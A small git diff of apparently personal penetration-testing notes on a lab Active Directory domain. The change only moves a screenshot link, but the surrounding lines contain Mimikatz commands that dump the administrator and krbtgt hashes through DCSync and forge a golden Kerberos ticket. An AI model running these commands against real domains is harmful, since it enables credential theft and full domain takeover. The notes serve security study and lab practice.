@@ -103,6 +103,7 @@ dcsync
     lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:administrator
     lsadump::dcsync /authdomain:lpt /authuser:server2019$ /authpassword:"" /authntlm /domain:lpt.com /dc:server2019 /user:krbtgt
 ![image](https://github.com/user-attachments/assets/bf3b892f-5ffd-4cff-a30c-fb63a3ff9ad6)
+![image](https://github.com/user-attachments/assets/24f1ebad-a84c-4a3a-a530-a711c97a9dfe)
 
     目前連到不到DC目錄
 ![image](https://github.com/user-attachments/assets/a610b8aa-ff61-405c-92c0-cded3b11437a)
@@ -121,7 +122,7 @@ PtT
     misc::cmd
     klist add_bind lpt.com server2019.lpt.com 
     kerberos::golden /domain:lpt.com /sid:<SID> /krbtgt:<HASH> /user:evil /ticket:evil.tck
-![image](https://github.com/user-attachments/assets/24f1ebad-a84c-4a3a-a530-a711c97a9dfe)
+
 
 SHELLSHOCK
 ---
